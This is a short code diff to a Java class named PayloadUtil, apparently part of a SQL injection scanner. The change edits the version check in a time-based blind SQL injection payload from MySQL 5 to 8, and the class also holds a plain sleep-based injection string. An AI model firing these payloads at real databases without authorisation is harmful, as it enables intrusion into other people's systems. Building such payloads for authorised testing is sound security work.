@@ -12,7 +12,7 @@ public class PayloadUtil {
     public ArrayList<String> payloads = new ArrayList<>();
 
     public PayloadUtil() {
-        payloads.add("test' and if(version() like '5%%',sleep(%d),'false');#");
+        payloads.add("test' and if(version() like '8%%',sleep(%d),'false');#");
         payloads.add("test' and sleep(%d);#");
 //        payloads.add("test' and sleep(%d)");
     }
